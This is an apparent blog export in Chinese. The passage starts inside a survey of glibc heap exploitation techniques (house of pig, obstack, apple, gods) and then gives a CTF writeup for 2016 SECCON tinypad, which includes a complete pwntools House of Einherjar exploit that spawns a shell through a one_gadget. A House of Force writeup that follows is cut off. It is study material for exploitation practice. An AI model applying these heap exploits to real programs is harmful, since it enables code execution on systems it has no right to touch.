的_IO_buf_base\n合理控制_IO_buf_end-_IO_buf_base 的值，进而控制分配的 chunk 的大小，分配到布局好的地址\n在 memcpy 中覆盖地址，如可以覆盖__malloc_hook/__free_hook 等\n\n该方法需要结合其他堆利用技术，需要保证 malloc 分配出来的 chunk 的地址是可控的。该方法主要提供了对 IO 系列函数中间接调用 mallc/free/memcpy 的组合利用。\n相关技巧\n可以 largebin attack 打掉 mp_.tcachebins，进而能把很大的 chunk 也放进入 tcache 进行管理\n高版本没有 hook 的话，可以利用 memcpy@got，通过覆写 got 来进行 rce\n可以多次 house of pig 组合调用\n\n利用效果\n任意函数执行\nROP 控制程序执行流\n\n2.24-house of obstack漏洞成因堆溢出\n适用范围\n2.23—— 至今\n可以执行一次 largebin attack\n可以触发 IO 流操作\n\n利用原理一条新的利用链，伪造 vtable 为_IO_obstack_jumps，然后调用到_IO_obstack_xsputn，紧接着调用 obstack_grow，其代码为：\n\n\n\n1 2 3 4 5 6 7 8 9 \n#define obstack_grow(OBSTACK, where, length)                      \\  __extension__                                   \\    ({ struct obstack *__o = (OBSTACK);                       \\       int __len = (length);                              \\       if (_o-&gt;next_free + __len &gt; __o-&gt;chunk_limit)                  \\     _obstack_newchunk (__o, __len);                      \\       memcpy (__o-&gt;next_free, where, __len);                     \\       __o-&gt;next_free += __len;                           \\       (void) 0; })\n\n\n\n\n\n\n\n然后在_obstack_newchunk 调用了 CALL_CHUNKFUN 这个宏\n这个宏会调用到函数指针：\n\n\n\n1 2 3 4 \n# define CALL_CHUNKFUN(h, size) \\  (((h)-&gt;use_extra_arg)                               \\   ? (*(h)-&gt;chunkfun)((h)-&gt;extra_arg, (size))                     \\   : (*(struct _obstack_chunk *(*)(long))(h)-&gt;chunkfun)((size)))\n\n\n\n\n\n\n\n因此，其就是利用该函数指针进行控制程序的执行流。\n相关技巧伪造的 IO_FILE 布局如下：\n\n利用 largebin attack 伪造_IO_FILE，记完成伪造的 chunk 为 A（或者别的手法）\nchunk A 内偏移为 0xd8 处设为_IO_obstack_jumps+0x20\nchunk A 内偏移为 0xe0 处设置 chunk A 的地址作为 obstack 结构体\nchunk A 内偏移为 0x18 处设为 1（next_free)\nchunk A 内偏移为 0x20 处设为 0（chunk_limit）\nchunk A 内偏移为 0x48 处设为 &amp;/bin/sh\nchunk A 内偏移为 0x38 处设为 system 函数的地址\nchunk A 内偏移为 0x28 处设为 1（_IO_write_ptr)\nchunk A 内偏移为 0x30 处设为 0 (_IO_write_end)\nchunk A 内偏移为 0x50 处设为 1 (use_extra_arg)\n\nglibc-2.37 开始这个方法的调用链为：__printf_buffer_as_file_overflow -&gt; __printf_buffer_flush -&gt; __printf_buffer_flush_obstack-&gt;__obstack_newchunk。\n利用效果\n任意函数执行\n\n2.25-house of apple1漏洞成因堆溢出\n适用范围\n2.23—— 至今\n程序从 main 函数返回或能调用 exit 函数\n能泄露出 heap 地址和 libc 地址\n能使用一次 largebin attack（一次即可）\n\n利用原理利用_IO_wstr_overflow 将任意地址存储的值修改已知值：\n比如修改 tcache 变量、mp_结构体、pointer_guard 变量等。\n修改成功后，再使用其他技术控制程序执行流。\n相关技巧house of apple1 是对现有一些 IO 流攻击方法的补充，能在一次劫持 IO 流的过程中做到任意地址写已知值，进而构造出其他方法攻击成功的条件。\n利用效果\n任意地址写已知堆地址\n\n2.26-house of apple2漏洞成因堆溢出\n适用范围\n2.23—— 至今\n已知 heap 地址和 glibc 地址\n能控制程序执行 IO 操作，包括但不限于：从 main 函数返回、调用 exit 函数、通过__malloc_assert 触发\n能控制_IO_FILE 的 vtable 和_wide_data，一般使用 largebin attack 去控制\n\n利用原理_IO_WIDE_JUMPS 没有检查_wide_vtable 的合法性：\n\n\n\n1 2 3 4 5 6 7 8 \n#define _IO_WOVERFLOW(FP, CH) WJUMP1 (__overflow, FP, CH) #define WJUMP1(FUNC, THIS, X1) (_IO_WIDE_JUMPS_FUNC(THIS)-&gt;FUNC) (THIS, X1) #define _IO_WIDE_JUMPS_FUNC(THIS) _IO_WIDE_JUMPS(THIS) #define _IO_WIDE_JUMPS(THIS) \\  _IO_CAST_FIELD_ACCESS ((THIS), struct _IO_FILE, _wide_data)-&gt;_wide_vtable\n\n\n\n\n\n\n\n所以利用_IO_wfile_jumps 等伪造_wide_vtable 即可。\n相关技巧利用_IO_wfile_overflow 函数控制程序执行流时对 fp 的设置如下：\n\n_flags 设置为 ~(2 | 0x8 | 0x800)，如果不需要控制 rdi，设置为 0 即可；如果需要获得 shell，可设置为 sh;，注意前面有两个空格\nvtable 设置为_IO_wfile_jumps/_IO_wfile_jumps_mmap/_IO_wfile_jumps_maybe_mmap 地址（加减偏移），使其能成功调用_IO_wfile_overflow 即可\n_wide_data 设置为可控堆地址 A，即满足 *(fp + 0xa0) = A\n_wide_data-&gt;_IO_write_base 设置为 0，即满足 *(A + 0x18) = 0\n_wide_data-&gt;_IO_buf_base 设置为 0，即满足 *(A + 0x30) = 0\n_wide_data-&gt;_wide_vtable 设置为可控堆地址 B，即满足 *(A + 0xe0) = B\n_wide_data-&gt;_wide_vtable-&gt;doallocate 设置为地址 C 用于劫持 RIP，即满足 *(B + 0x68) = C\n\n利用效果\n任意函数执行\n\n2.27-house of apple3漏洞成因堆溢出\n适用范围\n2.23—— 至今\n已知 heap 地址和 glibc 地址\n能控制程序执行 IO 操作，包括但不限于：从 main 函数返回、调用 exit 函数、通过__malloc_assert 触发\n能控制_IO_FILE 的 vtable 和_wide_data，一般使用 largebin attack 去控制\n\n利用原理__libio_codecvt_in 等函数，可以设置 gs-&gt;__shlib_handle == NULL 绕过 PTR_DEMANGLE 对指针的保护，然后通过_IO_wfile_underflow 调用到__libio_codecvt_in 来控制函数指针，执行任意代码。\n相关技巧利用_IO_wfile_underflow 函数控制程序执行流时对 fp 的设置如下：\n\n_flags 设置为 ~(4 | 0x10)\nvtable 设置为_IO_wfile_jumps 地址（加减偏移），使其能成功调用_IO_wfile_underflow 即可\nfp-&gt;_IO_read_ptr &lt; fp-&gt;_IO_read_end，即满足 *(fp + 8) &lt; *(fp + 0x10)\n_wide_data 保持默认，或者设置为堆地址，假设其地址为 A，即满足 *(fp + 0xa0) = A\n_wide_data-&gt;_IO_read_ptr &gt;= _wide_data-&gt;_IO_read_end，即满足 *A &gt;= *(A + 8)\n_codecvt 设置为可控堆地址 B，即满足 *(fp + 0x98) = B\ncodecvt-&gt;__cd_in.step 设置为可控堆地址 C，即满足 *B = C\ncodecvt-&gt;__cd_in.step-&gt;__shlib_handle 设置为 0，即满足 *C = 0\ncodecvt-&gt;__cd_in.step-&gt;__fct 设置为地址 D, 地址 D 用于控制 rip，即满足 *(C + 0x28) = D。当调用到 D 的时候，此时的 rdi 为 C。如果_wide_data 也可控的话，rsi 也能控制。\n\n利用效果\n任意函数执行\n\n2.28-house of gods漏洞成因堆溢出\n适用范围\n2.23——2.27\n泄露堆地址和 libc 地址\n任意大小分配\n\n利用原理这个技巧比较有意思，非常建议把作者的原博客读一下。我会简述一下该技巧的利用过程。\n总的来说，该技巧最终的目的是伪造一个 fake arena，通过劫持 main_arena.next 字段完成。\n其主要过程为：\n\n通过 binmap 的赋值，将其当做 chunk 的 size，然后修改 unsortedbin 链的 bk 指向 binmap，作者选择的是 0x90 大小的 chunk，释放后恰好让 binmap 称为 0x200，然后 binmap-&gt;bk 是 main_arena(初始状态下 main_arena.next = &amp;main_arena)，然后 main_arena-&gt;bk= fastbin[0x40]\n分配 0x1f0 大小的 chunk 就刚好能分配到 binmap\n之后修改掉 main_arena 的 system_mem 为很大的值和 next 指向 fake arena\n然后用 unsortedbin attack 打掉 narenas，将其改为一个很大的数\n然后分配两次 malloc(0xffffffffffffffbf + 1)，触发 arena_get_retry，进而触发两次 reused_arena，就能把 fake arena 给 thread_arena 变量\n最后直接伪造 fastbin 任意地址分配\n\n相关技巧\n仅仅借助 unsortedbin 链就能控制 main_arena 的 next 和 system_mem\n利用 binmap 的值构造出合法的 size\n\n利用效果\n劫持 thread_arena 为 fake_arena\n\n3 - 总结\n总结了 28 种 house of 系列利用手法\n给出了每种利用手法的影响版本、适用范围、利用原理等\n所有的利用方法都可以在源码中找到答案，因此强烈建议将源码反复阅读\n可以根据目前已有的技术提出新的组合技\n\n4 - 参考[1] 堆利用系列之 house of spirit - 安全客 - 安全资讯平台 (anquanke.com)\n[2] shellphish/how2heap: A repository for learning various heap exploitation techniques. (github.com)\n[3] Overview of GLIBC heap exploitation techniques (0x434b.dev)\n[4] [原创] CTF 中 glibc 堆利用 及 IO_FILE 总结 - Pwn - 看雪论坛 - 安全社区 | 安全招聘 | bbs.pediy.com (kanxue.com)\n[5] PWN——House Of Einherjar CTF Wiki 例题详解 - 安全客 - 安全资讯平台 (anquanke.com)\n[6] Top chunk 劫持：House of force 攻击 - 安全客 - 安全资讯平台 (anquanke.com)\n[7] House of Lore - CTF Wiki (ctf-wiki.org)\n[8] House of orange - 安全客 - 安全资讯平台 (anquanke.com)\n[9] house of rabbit\n[10] House of Roman - CTF Wiki (ctf-wiki.org)\n[11] House of storm 原理及利用 - 安全客 - 安全资讯平台 (anquanke.com)\n[12] House-of-Corrosion 一种新的堆利用技巧 - 先知社区 (aliyun.com)\n[13] house-of-husk 学习笔记 - 安全客 - 安全资讯平台 (anquanke.com)\n[14] House of Muney 分析 - 安全客 - 安全资讯平台 (anquanke.com)\n[15] 奇安信攻防社区 - 深入理解 House of Botcake 堆利用手法 (butian.net)\n[16] c4ebt/House-of-Rust: The House of Rust is a heap exploitation technique that drops a shell against full PIE binaries that don’t leak any addresses. (github.com)\n[17] house of banana - 安全客 - 安全资讯平台 (anquanke.com)\n[18] House OF Kiwi - 安全客 - 安全资讯平台 (anquanke.com)\n[19] house of emma\n[20] house of pig 一个新的堆利用详解 - 安全客 - 安全资讯平台 (anquanke.com)\n[21] 一条新的 glibc IO_FILE 利用链：_IO_obstack_jumps 利用分析 - 跳跳糖 (tttang.com)\n[22] House of Apple 一种新的 glibc 中 IO 攻击方法 (1) - roderick - record and learn! (roderickchan.cn)\n[23] House of Apple 一种新的 glibc 中 IO 攻击方法 (2) - roderick - record and learn! (roderickchan.cn)\n[24] House of Apple 一种新的 glibc 中 IO 攻击方法 (3) - roderick - record and learn! (roderickchan.cn)\n[25] GlibcHeap-house of muney - roderick - record and learn! (roderickchan.cn)\n[26] house-of-gods/HOUSE_OF_GODS.TXT at master · Milo-D/house-of-gods (github.com)\n","categories":["heap"],"tags":["House of 系列"]},{"title":"House of Einherjar","url":"/2023/04/10/House%20of%20Einherjar/","content":"House of Einherjar原理释放堆块时，unlink后向合并堆块，强制使得 malloc 返回一个几乎任意地址的 chunk 。\nfree 函数中的后向合并核心操作如下\n/* consolidate backward */if (!prev_inuse(p)) {    prevsize = prev_size(p);    size += prevsize;    p = chunk_at_offset(p, -((long) prevsize));    unlink(av, p, bck, fwd);}\n\n\n后向合并时，新的 chunk 的位置取决于 chunk_at_offset(p, -((long) prevsize))\n\n思路1：两个chunk通过后向unlink直接实现任意地址写假设有两个连续的chunk，我们利用低地址的chunk将高地址 chunk 的 prev_size 写为目标地址与当前地址的差值，free后合并，再malloc，就可以申请到目标地址的chunk，实现任意地址写，但是需要在目的 chunk 附近构造相应的 fake chunk，fake_chunk的size字段，必须和chunk_b的pre_size字段一致，为二者之间的偏移量，从而绕过 unlink 的检测。\n思路2：三个chunk通过后向unlink实现double freechunk_0  0xD0    # 堆块大小需要保证释放后不进入tcache bin和fastbin，即存在tcache需要先填满对应的tcache chunk_1  0x18    # 堆块大小以8结尾，保证off by null可以覆盖到下一个堆块的prev_inusechunk_2  0xD0    # 堆块大小的最后一个字节必须为00，也就是上一个堆块覆盖prev_inuse后不会影响该堆块的大小chunk_3  0x10    # 堆块大小任意，防止前面的堆块合并到Top chunk中\n\n申请四个chunk，第四个chunk用来将前三个chunk与top chunk隔开（防止free前三个chunk后与top chunk合并），先free(chunk_0)，利用off-by-null修改第2个chunk的mem，将第三个chunk的的prev_size修改为前两个chunk大小之和，然后free(chunk_2)，将chunk_0,chunk_1,chunk_2合并，之后申请chunk_0大小和chunk_1大小的chunk，再free(chunk_1),free(chunk_5)，实际chunk_1和chunk_5是同一个chunk，从而实现double free。\n例题：2016_seccon_tinypad\n运行程序发现有四个功能：增删改退，分别用a,d,e,q进行操作，并且每次进行一次操作，程序会把每个chunk的内容输出出来，根据ida伪代码发现只能最多申请4个chunk\nida伪代码主函数\nint __cdecl main(int argc, const char **argv, const char **envp){  __int64 v3; // rax  int choice; // eax  int v5; // eax  __int64 v6; // rax  size_t v7; // rax  int c; // [rsp+4h] [rbp-1Ch] BYREF  int i; // [rsp+8h] [rbp-18h]  int index; // [rsp+Ch] [rbp-14h]  int v12; // [rsp+10h] [rbp-10h]  int v13; // [rsp+14h] [rbp-Ch]  unsigned __int64 v14; // [rsp+18h] [rbp-8h]  v14 = __readfsqword(0x28u);  v12 = 0;  write_n(&amp;unk_4019F0, 1uLL);  write_n(    \"  ============================================================================\\n\"    \"// _|_|_|_|_|  _|_|_|  _|      _|  _|      _|  _|_|_|      _|_|    _|_|_|     \\\\\\\\\\n\"    \"||     _|        _|    _|_|    _|    _|  _|    _|    _|  _|    _|  _|    _|   ||\\n\"    \"||     _|        _|    _|  _|  _|      _|      _|_|_|    _|_|_|_|  _|    _|   ||\\n\"    \"||     _|        _|    _|    _|_|      _|      _|        _|    _|  _|    _|   ||\\n\"    \"\\\\\\\\     _|      _|_|_|  _|      _|      _|      _|        _|    _|  _|_|_|     //\\n\"    \"  ============================================================================\\n\",    563uLL);  write_n(&amp;unk_4019F0, 1uLL);  do  {    for ( i = 0; i &lt;= 3; ++i )    {      LOBYTE(c) = i + 49;      writeln(\"+------------------------------------------------------------------------------+\\n\", 81LL);      write_n(\" #   INDEX: \", 12uLL);      writeln(&amp;c, 1LL);      write_n(\" # CONTENT: \", 12uLL);      if ( *&amp;tinypad[16 * i + 264] )      {        v3 = strlen(*&amp;tinypad[16 * i + 264]);        writeln(*&amp;tinypad[16 * i + 264], v3);      }      writeln(&amp;unk_4019F0, 1LL);    }    index = 0;    choice = getcmd();    v12 = choice;    if ( choice == 68 )    {      write_n(\"(INDEX)&gt;&gt;&gt; \", 11uLL);      index = read_int();      if ( index &lt;= 0 || index &gt; 4 )            // 只能申请四个chunk                                                //       {LABEL_29:        writeln(\"Invalid index\", 13LL);        continue;      }      if ( !*&amp;tinypad[16 * index + 240] )      {LABEL_31:        writeln(\"Not used\", 8LL);        continue;      }      free(*&amp;tinypad[16 * index + 248]);      *&amp;tinypad[16 * index + 240] = 0LL;        // size置为0，头指针未置为0      writeln(\"\\nDeleted.\", 9LL);      \t\t\t\t\t//uaf    }    else if ( choice &gt; 0x44 )    {      if ( choice != 0x45 )      {        if ( choice == 81 )          continue;LABEL_41:        writeln(\"No such a command\", 17LL);        continue;      }      write_n(\"(INDEX)&gt;&gt;&gt; \", 11uLL);      index = read_int();      if ( index &lt;= 0 || index &gt; 4 )        goto LABEL_29;      if ( !*&amp;tinypad[16 * index + 240] )        goto LABEL_31;      c = 48;      strcpy(tinypad, *&amp;tinypad[16 * index + 248]);      while ( toupper(c) != 89 )      {        write_n(\"CONTENT: \", 9uLL);        v6 = strlen(tinypad);        writeln(tinypad, v6);        write_n(\"(CONTENT)&gt;&gt;&gt; \", 13uLL);        v7 = strlen(*&amp;tinypad[16 * index + 248]);        read_until(tinypad, v7, 10u);        writeln(\"Is it OK?\", 9LL);        write_n(\"(Y/n)&gt;&gt;&gt; \", 9uLL);        read_until(&amp;c, 1uLL, 10u);      }      strcpy(*&amp;tinypad[16 * index + 248], tinypad);      writeln(\"\\nEdited.\", 8LL);    }    else    {      if ( choice != 65 )        goto LABEL_41;      while ( index &lt;= 3 &amp;&amp; *&amp;tinypad[16 * index + 256] )        ++index;      if ( index == 4 )      {        writeln(\"No space is left.\", 17LL);      }      else      {        v13 = -1;        write_n(\"(SIZE)&gt;&gt;&gt; \", 10uLL);        v13 = read_int();        if ( v13 &lt;= 0 )        {          v5 = 1;        }        else        {          v5 = v13;          if ( v13 &gt; 0x100 )            v5 = 256;        }        v13 = v5;        *&amp;tinypad[16 * index + 256] = v5;        *&amp;tinypad[16 * index + 264] = malloc(v13);        if ( !*&amp;tinypad[16 * index + 264] )        {          writerrln(\"[!] No memory is available.\", 27LL);          exit(-1);        }        write_n(\"(CONTENT)&gt;&gt;&gt; \", 13uLL);        read_until(*&amp;tinypad[16 * index + 264], v13, 10u);        writeln(\"\\nAdded.\", 7LL);      }    }  }  while ( v12 != 81 );  return 0;}\n\nadd函数\n*&amp;tinypad[16 * index + 0x100] = v5;   *&amp;tinypad[16 * index + 264] = malloc(v13);\n\n存在chunk全局数组，起始地址从0x602040+16*0+0x100=0x602140 开始依次存放chunk的size大小和头指针\nedit函数该edit函数调用的read_until函数存在off-by-null漏洞\nfree函数free函数存在uaf漏洞\n思路首先泄露libc和heap地址\n利用 house of einherjar 方法在 tinypad 的前0x100字节中伪造 chunk。当我们再次申请时，那么就可以控制4个 memo 的指针和内容了。\n这里虽然我们的第一想法可能是直接覆盖 malloc_hook 为 one_gadget 地址，但是，由于当编辑时，程序是利用 strlen 来判读可以读取多少长度，而 malloc_hook 则在初始时为 0。不能覆盖malloc_hook\nv6 = strlen(tinypad);\n\n可以泄露出environ 的地址，通过gdb调试进而求得存储 main 函数的返回地址的地址，将main 函数的返回地址覆盖为one_gadget来获得shell\n利用过程先把前面的代码写好\n# coding=utf-8from pwn import*context(endian='little',os='linux',arch='amd64',log_level='debug') #小端序，linux系统，64位架构,debugsh = process('./tinypad')libc = ELF('//home/pwn/tools/glibc-all-in-one/libs/2.23-0ubuntu11_amd64/libc-2.23.so')#命令简写化s       = lambda data               :sh.send(data)sa      = lambda delim,data         :sh.sendafter(delim, data)sl      = lambda data               :sh.sendline(data)sla     = lambda delim,data         :sh.sendlineafter(delim, data)r       = lambda num=4096           :sh.recv(num)ru      = lambda delims             :sh.recvuntil(delims)itr     = lambda                    :sh.interactive()uu32    = lambda data               :u32(data.ljust(4,'\\0'))uu64    = lambda data               :u64(data.ljust(8,'\\0'))leak    = lambda name,addr          :log.success('{} = {:#x}'.format(name, addr))lg      = lambda address,data       :log.success('%s: '%(address)+hex(data))#定义gdb调试函数def dbg():        gdb.attach(sh)        pause()def add(size, content='a'):    sla('(CMD)&gt;&gt;&gt; ','a')    sla('(SIZE)&gt;&gt;&gt; ',str(size))    sla('(CONTENT)&gt;&gt;&gt; ',content)def edit(idx, content):    sla('(CMD)&gt;&gt;&gt; ','e')    sla('(INDEX)&gt;&gt;&gt; ',str(idx))    sla('(CONTENT)&gt;&gt;&gt; ',content)    sla('Is it OK?\\n','Y')   def free(idx):    sla('(CMD)&gt;&gt;&gt; ','d')    sla('(INDEX)&gt;&gt;&gt; ',str(idx))def exit():    sla('(CMD)&gt;&gt;&gt; ','Q')\n\n先申请四个chunk，free(3)和free(1),堆块大于0x7f，所以会进入unsorted bin里，chunk是从1开始计数的，此时chunk_1里存放的就是chunk_3的头指针和main_arena+88的地址，chunk_3的头指针前面有两个大小为(0x100+0x10)的chunk，减去(0x100+0x10)*2就是heap的基地址，之后计算出main_arena+88与libc基地址的距离（这个距离是固定的）0x7f19d3ef7b78−0x7f19d3b33000=0x3C4B78\nadd(0x100)add(0x100)add(0x100)add(0x100)free(3)free(1)ru('INDEX: 1')ru('CONTENT: ')heapbase = u64(ru('\\n')[:-1].ljust(8,b'\\x00')) -(0x100+0x10)*2ru('INDEX: 3')ru('CONTENT: ')libcbase = u64(ru('\\n')[:-1].ljust(8,b'\\x00')) - 0x3C4B78environ = libc.sym['environ']+libcbaselg('heapbase',heapbase)lg('libcbase',libcbase)dbg()\n\n\n在 tinypad 的前0x100字节中伪造 chunk。当我们再次申请时，那么就可以控制4个 memo 的指针和内容了。\nadd(0x100)add(0x100)#dbg()#四个chunk与top chunk合并free(4)free(1)free(2)free(3)#dbg()#empty now add(0x100,'a'*0x100)edit(1,b'a'*0x30+p64(0)+p64(0x41)+p64(0x602070)*2+b'\\x00'*0x20+p64(0x40))#dbg()free(1)add(0x10) #1add(0xf0) #2add(0x10) #3add(0x100,'a'*0x100) #4\n\n之后free(1)，再申请0x18大小的chunk_1，利用add函数里自定义的read函数的off-by-null，可以将chunk_2的pre_size改为chunk数组附近0x602070处，再次free(2)，这样利用House of einherjar，可以将free的 chunk转移到0x602070（chunk_2的头指针）处，就可以0x602040（chunk_1的头指针）处形成我们提前构造好的chunk\n#edit(1,b'a'*0x30+p64(0)+p64(0x41)+p64(0x602070)*2+b'\\x00'*0x20+p64(0x40))free(1)target = heapbase+0x20-0x602070add(0x18,b'a'*0x10+p64(target)) #1dbg()\n\n再free（2），编辑chunk_4就相当于在0x602040处的chunk开始编辑，将\nfree(2)edit(4,b'a'*0x30+p64(0)+p64(0x101)+p64(main_arena_88)*2)dbg()\n\n\n再申请0xf0大小的chunk（实际大小为0x100），此时申请的chunk就在0x602070处，而该chunk的mem区域与chunk全局数组起始地址0x602140相差（0x602140-0x602070+0x10）=0xc0，用字符a填充，之后按照chunk size+头指针依次填充全局数组，将chunk_1改为environ地址，chunk2改为0x602148地址（也就是存放environ地址的地址）\nadd(0xf0,b'a'*0xc0+p64(0x100)+p64(environ)+p64(0x100)+p64(0x602148))ru('INDEX: 1')ru('CONTENT: ')stack= u64(ru('\\n')[:-1].ljust(8,b'\\x00'))target =  -0xF0 + stack lg('stack',stack)lg('target',target)#0x7fc7dd85ff38 &lt;environ&gt;:\t0x00007ffc91b85d58\t0x0000000000000000#1e:00f0│       0x7ffc91b85c68 —▸ 0x7fc7dd4b9830 (__libc_start_main+240) ◂— mov    edi, eax#  0x7ffc91b85c68-0x00007ffc91b85d58=-0xF0dbg()\n\n\n泄露出来的chunk_1的内容就是栈地址 stack=0x00007ffc91b85d58，在查看栈区main函数返回地址0x7ffc91b85c68，0x7ffc91b85c68-0x00007ffc91b85d58=-0xF0，所以我们要覆盖的main函数返回地址为target = -0xF0 + stack刚才我们把chunk_2的mem指向了chunk_1的mem指针，编辑chunk_2为target地址，把chunk_1的mem指针改为target地址，这时再次编辑chunk_1为one_gadget地址，就把target地址存放的main函数返回地址改为了exeve(“/bin/sh\\x00”)，再退出程序，获得shell\nedit(2,p64(target))one_gadget = [0x45216,0x4526a,0xf02a4,0xf1147]shell = one_gadget[0] + libcbaseedit(1,p64(shell))exit()itr()\n\n\nexp# coding=utf-8from pwn import*context(endian='little',os='linux',arch='amd64',log_level='debug') #小端序，linux系统，64位架构,debugsh = process('./tinypad')libc = ELF('/home/pwn/tools/glibc-all-in-one/libs/2.23-0ubuntu11_amd64/libc-2.23.so')#命令简写化s       = lambda data               :sh.send(data)sa      = lambda delim,data         :sh.sendafter(delim, data)sl      = lambda data               :sh.sendline(data)sla     = lambda delim,data         :sh.sendlineafter(delim, data)r       = lambda num=4096           :sh.recv(num)ru      = lambda delims             :sh.recvuntil(delims)itr     = lambda                    :sh.interactive()uu32    = lambda data               :u32(data.ljust(4,'\\0'))uu64    = lambda data               :u64(data.ljust(8,'\\0'))leak    = lambda name,addr          :log.success('{} = {:#x}'.format(name, addr))lg      = lambda address,data       :log.success('%s: '%(address)+hex(data))#定义gdb调试函数def dbg():        gdb.attach(sh)        pause()def add(size, content='a'):    sla('(CMD)&gt;&gt;&gt; ','a')    sla('(SIZE)&gt;&gt;&gt; ',str(size))    sla('(CONTENT)&gt;&gt;&gt; ',content)def edit(idx, content):    sla('(CMD)&gt;&gt;&gt; ','e')    sla('(INDEX)&gt;&gt;&gt; ',str(idx))    sla('(CONTENT)&gt;&gt;&gt; ',content)    sla('Is it OK?\\n','Y')   def free(idx):    sla('(CMD)&gt;&gt;&gt; ','d')    sla('(INDEX)&gt;&gt;&gt; ',str(idx))def exit():    sla('(CMD)&gt;&gt;&gt; ','Q')\t add(0x100)add(0x100)add(0x100)add(0x100)free(3)free(1)ru('INDEX: 1')ru('CONTENT: ')heapbase = u64(ru('\\n')[:-1].ljust(8,b'\\x00')) -(0x100+0x10)*2ru('INDEX: 3')ru('CONTENT: ')main_arena_88 = u64(ru('\\n')[:-1].ljust(8,b'\\x00')) libcbase = main_arena_88-0x3C4B78environ = libc.sym['environ']+libcbaselg('heapbase',heapbase)lg('libcbase',libcbase)#dbg()add(0x100)add(0x100)#dbg()#四个chunk与top chunk合并free(4)free(1)free(2)free(3)#dbg()#empty now add(0x100,'a'*0x100)edit(1,b'a'*0x30+p64(0)+p64(0x41)+p64(0x602070)*2+b'\\x00'*0x20+p64(0x40))#dbg()free(1)add(0x10) #1add(0xf0) #2add(0x10) #3add(0x100,'a'*0x100) #4#dbg()free(1)#dbg()target = heapbase+0x20-0x602070add(0x18,b'a'*0x10+p64(target)) #1free(2)#dbg()edit(4,b'a'*0x30+p64(0)+p64(0x101)+p64(main_arena_88)*2)#dbg()add(0xf0,b'a'*0xc0+p64(0x100)+p64(environ)+p64(0x100)+p64(0x602148))ru('INDEX: 1')ru('CONTENT: ')stack= u64(ru('\\n')[:-1].ljust(8,b'\\x00'))target =  -0xF0 + stack lg('stack',stack)lg('target',target)#0x7f825ab56f38 &lt;environ&gt;:\t0x00007ffe282d8c28\t0x0000000000000000#00:0000│  0x7ffe282d8b38 —▸ 0x7f825a7b0830 (__libc_start_main+240) ◂— mov    edi, eax#  0x7ffe282d8b38-0x00007ffe282d8c28=-0xF0#dbg()edit(2,p64(target))one_gadget = [0x45216,0x4526a,0xf02a4,0xf1147]shell = one_gadget[0] + libcbaseedit(1,p64(shell))exit() itr()","categories":["heap"],"tags":["House of 系列"]},{"title":"House of Force2","url":"/2023/04/10/House%20of%20Force2/","content":"House Of Force2基于top chunk分配机制的利用,glibc会对用户请求的size_1和top chunk现有的size_0进行验证，如果size_0大于用户申请的chunk大小size_1，就会将从top chunk中切割出size_1大小的chunk，剩余部分放入top chunk。\n如果top chunk足够大（size_0大于top chunk与目标地址的距离），malloc两次，第二次申请的chunk就会到目标地址处，实现一次任意地址写。\n然而实际上top chunk 的size_0，一般不会这么大，所以这种利用手法的前提是可以修改top chunk的size_0大小,把它变成一个很大的数,一般是将其改为-1（32位：0xffffffff，64位:0xffffffffffffffff），因为在将size_0和size_1进行比较时会把size转换成无符号长整型数，因此-1也就是说unsigned long中最大的数。\nglibc源码：// 获取当前的top chunk，并计算其对应的大小victim = av-&gt;top;size   = chunksize(victim);// 如果在分割之后，其大小仍然满足 chunk 的最小大小，那么就可以直接进行分割。if ((unsigned long) (size) &gt;= (unsigned long) (nb + MINSIZE)) {    remainder_size = size - nb;    remainder      = chunk_at_offset(victim, nb);    av-&gt;top        = remainder;    set_head(victim, nb | PREV_INUSE |            (av != &amp;main_arena ? NON_MAIN_ARENA : 0));    set_head(remainder, remainder_size | PREV_INUSE);    check_malloced_chunk(av, victim, nb);    void *p = chunk2mem(victim);    alloc_perturb(p, bytes);    return p;}\n\n例题bcloud_bctf_2016\n程序实现了三个功能，增加一个chunk，编辑一个chunk的内容，删除一个chunk\nadd函数int add(){  int result; // eax  int i; // [esp+18h] [ebp-10h]  int v2; // [esp+1Ch] [ebp-Ch]  for ( i = 0; i &lt;= 9 &amp;&amp; heap_array[i]; ++i )    ;  if ( i == 10 )    return puts(\"Lack of space. Upgrade your account with just $100 :)\");  puts(\"Input the length of the note content:\");  v2 = choose();  heap_array[i] = malloc(v2 + 4);  if ( !heap_array[i] )    exit(-1);  dword_804B0A0[i] = v2;  puts(\"Input the content:\");  readd(heap_array[i], v2, 10);  printf(\"Create success, the id is %d\\n\", i);  result = i;  dword_804B0E0[i] = 0;  return result;}\n\nadd函数申请chunk时会创建一个存放所有chunk mem指针的全局数组，思考如果可以申请chunk到全局数组处，修改全局数组，实现任意地址写\nedit函数int edit(){  unsigned int v1; // [esp+14h] [ebp-14h]  int v2; // [esp+18h] [ebp-10h]  int v3; // [esp+1Ch] [ebp-Ch]  puts(\"Input the id:\");  v1 = choose();  if ( v1 &gt;= 0xA )    return puts(\"Invalid ID.\");  v2 = heap_array[v1];  if ( !v2 )    return puts(\"Note has been deleted.\");  v3 = dword_804B0A0[v1];  dword_804B0E0[v1] = 0;  puts(\"Input the new content:\");  readd(v2, v3, 10);  return puts(\"Edit success.\");}\n\ndelete函数int delete(){  unsigned int v1; // [esp+18h] [ebp-10h]  void *index; // [esp+1Ch] [ebp-Ch]  puts(\"Input the id:\");  v1 = choose();  if ( v1 &gt;= 0xA )    return puts(\"Invalid ID.\");  index = heap_array[v1];  if ( !index )    return puts(\"Note has been deleted.\");  heap_array[v1] = 0;  dword_804B0A0[v1] = 0;  free(index);  #UAF  return puts(\"Delete success.\");}\n\ndelete函数在释放chunk时存在UAF漏洞\n自定义一个read函数int __cdecl readd(int a1, int a2, char a3){  char buf; // [esp+1Bh] [ebp-Dh] BYREF  int i; // [esp+1Ch] [ebp-Ch]  for ( i = 0; i &lt; a2; ++i )  {    if ( read(0, &amp;buf, 1u) &lt;= 0 )      exit(-1);    if ( buf == a3 )      break;    *(a1 + i) = buf;  }  *(i + a1) = 0;  return i;}\n\n三个参数，a1为要输入的地址，a2为输入大小，a3为截止符\n先把前面的一些东西写好from pwn import *from LibcSearcher import *context(endian='little',os='linux',arch='i386',log_level='debug') #小端序，linux系统，64位架构,debug#定义gdb调试函数def dbg():        gdb.attach(sh)        pause()#命令简写化s       = lambda data               :sh.send(data)sa      = lambda delim,data         :sh.sendafter(delim, data)sl      = lambda data               :sh.sendline(data)sla     = lambda delim,data         :sh.sendlineafter(delim, data)r       = lambda num=4096           :sh.recv(num)ru      = lambda delims, drop=True  :sh.recvuntil(delims, drop)itr     = lambda                    :sh.interactive()uu32    = lambda data               :u32(data.ljust(4,'\\0'))uu64    = lambda data               